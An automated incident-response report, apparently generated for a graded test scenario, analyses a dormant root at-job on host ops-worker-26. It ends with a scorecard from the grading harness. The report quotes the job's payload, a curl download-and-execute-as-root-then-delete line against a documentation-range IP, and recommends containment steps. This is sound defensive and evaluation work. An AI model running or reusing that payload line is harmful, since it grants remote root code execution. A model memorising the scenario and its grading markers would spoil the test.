# Incident Response Report — ops-worker-26
## Scenario 26: Dormant `at`-job Scheduled 60 Days Out

| Field | Value |
|-------|-------|
| **Case ID** | agent-guard-scenario-26 |
| **Host** | ops-worker-26 |
| **Evidence Root** | `evidence/attack-scenario-26-atjob/` |
| **Analysis Date** | 2026-04-23 (UTC) |
| **Analyst** | findevil / Claude (automated) |
| **Classification** | **CONFIRMED COMPROMISE** |

---

## Executive Summary

An attacker with access to the account `alice` used her sudo privileges on **2026-04-20 at 14:24:42 UTC** to schedule a dormant `at`-job that will execute as **root** on **2026-06-19 at 14:24:42 UTC** — 60 days after the original session. The job downloads an unknown payload from `198.51.100.202` and executes it in-memory with all evidence removed afterward. The spool file was already present in `/var/spool/cron/atjobs/` at the time of evidence collection, confirming the job remains armed.

**The job has not yet fired. If not neutralised before 2026-06-19T14:24:42Z it will execute arbitrary code as root on this host.**

---

## Timeline of Events

| Timestamp (UTC) | Source | Event |
|-----------------|--------|-------|
| 2026-04-20 08:00:01 | auth.log (CRON) | Routine root cron session — baseline normal |
| 2026-04-20 14:22:14 | auth.log (sshd) | `alice` authenticated via SSH publickey from **10.0.2.15** (port 45120) |
| 2026-04-20 14:24:42 | auth.log (sudo) | `alice` escalated to root and executed: `/usr/bin/at -f /tmp/maintenance.sh now + 60 days` |
| 2026-04-20 14:24:43 | auth.log (atd) | `atd` registered: **job 20187c2e8f will run at Tue Jun 19 14:24:42 2026** |
| 2026-04-20 14:25:12 | auth.log (sshd) | `alice` SSH session closed |
| **2026-06-19 14:24:42** | **Projected** | **Payload download and execution as root (not yet occurred)** |

---

## Persistence Mechanism — `at`-job Analysis

### Spool File

| Attribute | Value |
|-----------|-------|
| **Path** | `/var/spool/cron/atjobs/a000020187c2e8f` |
| **Job ID** | `20187c2e8f` |
| **Run-as** | uid=0, gid=0 (root) |
| **Scheduled execution** | **2026-06-19T14:24:42Z** |
| **Working directory** | `/root` |

### Payload Command (line 15 of spool file)

```sh
curl -sSf -o /tmp/.m https://198.51.100.202/m 2>/dev/null && /bin/bash /tmp/.m 2>/dev/null; rm -f /tmp/.m
```

**Behaviour breakdown:**

| Stage | Detail |
|-------|--------|
| Download | `curl -sSf` fetches `https://198.51.100.202/m` silently into `/tmp/.m` (hidden dot-file) |
| Suppress errors | `2>/dev/null` on both commands — no stderr noise to logs |
| Execute | `/bin/bash /tmp/.m` runs the payload as root |
| Cover tracks | `rm -f /tmp/.m` deletes the downloaded script immediately after execution |

This is a classic **time-delayed, file-less-style** C2 callback: the payload lives only at the remote URL until the moment it is needed, is executed entirely from a tmpfs-backed `/tmp`, and is deleted before any subsequent inspection. No persistent payload binary exists on disk now — only the `at`-job spool file.

---

## Indicators of Compromise

### Network

| Indicator | Type | Context |
|-----------|------|---------|
| `198.51.100.202` | IPv4 — C2 server | Payload download host (`/m` endpoint); not in local IOC cache |

> **Note:** `198.51.100.202` falls within `198.51.100.0/24` (RFC 5737 TEST-NET-3 in documentation ranges). In a production scenario this address would be treated as a live external C2 host. Perform external lookups (VirusTotal, Shodan, AbuseIPDB) before containment to confirm classification.

### Host

| Indicator | Type | Context |
|-----------|------|---------|
| `/var/spool/cron/atjobs/a000020187c2e8f` | Malicious spool file | Armed at-job, executes as root 2026-06-19 |
| `/tmp/maintenance.sh` | Source script (deleted) | The script `alice` submitted to `at`; no longer present on disk |
| `/tmp/.m` | Transient payload (not yet created) | Will be written at execution time and removed immediately |

### Account

| Indicator | Type | Context |
|-----------|------|---------|
| `alice` (uid=1002) | Compromised or insider account | Sole actor; used sudo to schedule root job |
| SSH key `ED25519 SHA256:aliceKey` | Auth credential | Used for the session; verify against authorised keys |
| Source IP `10.0.2.15` | Attacker/pivot IP | RFC 1918 — internal or NAT'd; may be a compromised internal host |

---

## System Configuration Review

### `/etc/passwd` — Accounts

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
alice:x:1002:1002:Alice SRE,,,:/home/alice:/bin/bash
```

No unexpected accounts. No UID-0 backdoor accounts.

### `/etc/shadow` — Password Hashes

- `root`: locked (`!*`) — root password login disabled, consistent with `PermitRootLogin no`
- `alice`: SHA-512 hash present — account is active

### `/etc/ssh/sshd_config`

```
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
```

No SSH backdoor configuration. The attacker relied on `alice`'s existing SSH key.

---

## Detection Gap Note

findevil's `find_persistence` scanner flagged this `at`-job via content-pattern matching (outbound download + execution from `/tmp`). However, the tool catalogue does **not** include an `at`-aware tool — there is no `atq`/`at -l` equivalent for offline spool inspection. Detection here depended on the generic filesystem scan catching the spool directory. Deployments should add explicit `/var/spool/cron/atjobs/` and `/var/spool/atjobs/` coverage to their persistence checks.

---

## Assessment

| Item | Finding |
|------|---------|
| **Compromise confirmed?** | YES |
| **Attacker has current access?** | NO (session closed 2026-04-20 14:25:12 UTC) |
| **Persistence active?** | YES — armed `at`-job in spool |
| **Payload fires before containment?** | **YES if no action taken before 2026-06-19T14:24:42Z** |
| **Privilege at execution** | **root (uid=0)** |
| **Attacker's current foothold** | alice's SSH key / sudo access |

---

## Recommended Actions

### Immediate (before 2026-06-19)

1. **Remove the at-job** on the live system:
   ```bash
   sudo atrm 20187c2e8f   # or: sudo rm /var/spool/cron/atjobs/a000020187c2e8f
   ```
2. **Revoke alice's SSH key** — rotate or remove `~/.ssh/authorized_keys` for `alice` until the compromise vector is understood.
3. **Audit alice's sudo privileges** — determine why `alice` has unrestricted sudo to `/usr/bin/at`; restrict to legitimate commands only.
4. **Investigate 10.0.2.15** — identify what host or NAT gateway maps to this address and determine if it is also compromised.
5. **Block 198.51.100.202** at perimeter firewall/egress filter to prevent payload retrieval even if a duplicate job exists elsewhere.

### Investigative Follow-up

6. **Audit `/tmp/maintenance.sh` origin** — determine how this script reached the host (wget, scp, another session not captured in this log window).
7. **Search for other at-jobs** cluster-wide: `atq` on all ops-worker-* hosts; check for the same job ID or same C2 address.
8. **Correlate alice's activity** across the wider environment — review VPN/LDAP/other system logs from the same session window (14:22–14:25 UTC on 2026-04-20).
9. **External IOC lookups** — submit `198.51.100.202` to VirusTotal, AbuseIPDB, Shodan; the endpoint `/m` suggests a multi-stage dropper.
10. **Preserve spool file** with hash before removal:
    ```bash
    sha256sum /var/spool/cron/atjobs/a000020187c2e8f > /evidence/a000020187c2e8f.sha256
    cp /var/spool/cron/atjobs/a000020187c2e8f /evidence/
    ```

---

## Confidence Assessment

| Finding | Confidence | Basis |
|---------|-----------|-------|
| Compromise occurred | HIGH | auth.log + spool file corroborate each other; job ID matches |
| `alice` account is the vector | HIGH | Only actor in log; sudo command directly created the job |
| Execution date 2026-06-19 | HIGH | atd log line explicitly states the date; matches spool filename timestamp |
| C2 at 198.51.100.202 | HIGH | Hard-coded in spool file |
| Payload behaviour | MEDIUM | Download-execute-delete pattern is clear; payload content unknown until URL is fetched |
| Attacker identity/intent | LOW | No additional context; insider threat vs. external compromise of alice both possible |

---

*Report generated automatically by findevil on ops-worker-26 evidence. All timestamps UTC. Evidence not modified.*

---

<!-- scorecard:start -->

## Verification scorecard

Mechanically computed by `scripts/grade_example_reports.py` against the
`agent_guard.SCENARIOS["26"]` markers (case-insensitive substring
match, identical logic to `tests/harness/agent_guard.py`'s grade()
function). No AI self-assessment is involved in these numbers.

| Metric | Score | % |
|---|---|---|
| Required markers found | 3/3 | **100%** |
| Cross-scenario markers absent | 9/9 | **100%** |
| Verdict-correctness confidence | — | **100%** |
| Hallucination-free confidence | — | **100%** |

**Overall confidence: HIGH** — every planted marker for this
scenario was surfaced in the report, and zero markers from any other
scenario leaked in. Re-grade with `python scripts/grade_example_reports.py`.

<!-- scorecard:end -->
